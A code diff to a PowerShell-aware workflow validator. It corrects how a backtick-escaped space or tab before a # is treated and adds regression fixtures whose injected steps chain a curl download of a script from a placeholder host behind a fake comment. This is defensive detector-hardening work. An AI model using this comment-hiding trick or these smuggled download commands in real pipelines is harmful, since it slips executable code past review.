@@ -803,6 +803,14 @@ function powerShellCodeProjection(text, options) {
     }
   };
   let index = 0;
+  // Round 49. The index of the character most recently consumed as the target
+  // of a backtick escape. The comment predicate below reads the raw character
+  // before a #, and a backtick makes the following space or tab literal, so the
+  // raw text alone cannot say whether that whitespace ended a token. Without
+  // this, `marker` + backtick + ` #text; <command>` was read as a comment when
+  // PowerShell keeps #text inside the argument and runs the command after the
+  // semicolon -- measured both ways.
+  let lastEscapedIndex = -1;
   while (index < text.length) {
     const character = text[index];
     // Block comments first: <# ... #> spans lines, so a scanner that only
@@ -823,6 +831,12 @@ function powerShellCodeProjection(text, options) {
       } else {
         emit(index, index + 2, true);
       }
+      // An escaped # never opens a comment either, and that case is already
+      // closed by this branch consuming both characters before the # branch can
+      // see them. What is recorded here is the *position* of the escaped
+      // character, so the # branch can tell escaped whitespace from real
+      // whitespace.
+      lastEscapedIndex = index + 1;
       index += 2;
       continue;
     }
@@ -854,9 +868,15 @@ function powerShellCodeProjection(text, options) {
       // comment for code can only cause a false rejection, which is loud and
       // gets fixed; mistaking code for a comment hides an executable suffix,
       // which is silent and is exactly what was reported.
+      // Round 49: whitespace that a backtick made literal did not end a token,
+      // so a # after it is still inside the argument. Confirmed against
+      // PowerShell's parser for an escaped space and an escaped tab, and
+      // executably -- the command after the semicolon ran in both.
       const previous = index === 0 ? '' : text[index - 1];
-      if (previous === '' || previous === ' ' || previous === '\t' ||
-          previous === '\n' || previous === '\r') {
+      const previousWasEscaped = index - 1 === lastEscapedIndex;
+      if (!previousWasEscaped &&
+          (previous === '' || previous === ' ' || previous === '\t' ||
+           previous === '\n' || previous === '\r')) {
         const start = index;
         while (index < text.length && text[index] !== '\n') index += 1;
         emit(start, index, true);
@@ -2654,6 +2674,12 @@ const FIXTURE_INVENTORY = Object.freeze([
   // projection was corrected this whole suffix was blanked and the step was
   // accepted; the same line without the # was already rejected.
   ['T1-MARKDOWN-087', 'request hidden behind a hash inside an argument token', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker#text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  // Round 49. The same hiding place reached through escaped whitespace: a
+  // backtick makes the space or tab literal, so it never ended the token and
+  // the # is still inside the argument. Built with fromCharCode so this file
+  // does not carry a raw backtick in a fixture string.
+  ['T1-MARKDOWN-088', 'request hidden behind an escaped space before a hash', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker" + String.fromCharCode(96) + " #text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  ['T1-MARKDOWN-089', 'request hidden behind an escaped tab before a hash', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker" + String.fromCharCode(96) + String.fromCharCode(9) + "#text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
   ['T1-MARKDOWN-072', 'supply prelude closed twice, shortening the compared region', 'markdown', (source) => replaceOnce(source, "          $strGlobalConfigDirectory = [System.IO.Path]::GetDirectoryName($env:npm_config_globalconfig)\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n", "          $strGlobalConfigDirectory = [System.IO.Path]::GetDirectoryName($env:npm_config_globalconfig)\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n")],
   ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
     '.markdownlint.jsonc': '{ "default": false }\n',
@@ -2897,6 +2923,8 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-085": "markdown-policy: markdown.policy.validate adds a dynamic or indirect execution path",
   "T1-MARKDOWN-086": "markdown-policy: markdown.markdownlint.lint adds a dynamic or indirect execution path",
   "T1-MARKDOWN-087": "acquire-policy: markdown.policy.acquire references an executable script path",
+  "T1-MARKDOWN-088": "acquire-policy: markdown.policy.acquire references an executable script path",
+  "T1-MARKDOWN-089": "acquire-policy: markdown.policy.acquire references an executable script path",
   "T1-MARKDOWN-023": "markdown-policy: markdown.markdownlint.lint contains a workflow expression",
   "T1-MARKDOWN-022": "policy: markdown.markdownlint job permissions differs from the locked policy",
   "T1-LINTASSET-001": "supply-policy: .markdownlint.jsonc does not match its reviewed digest",
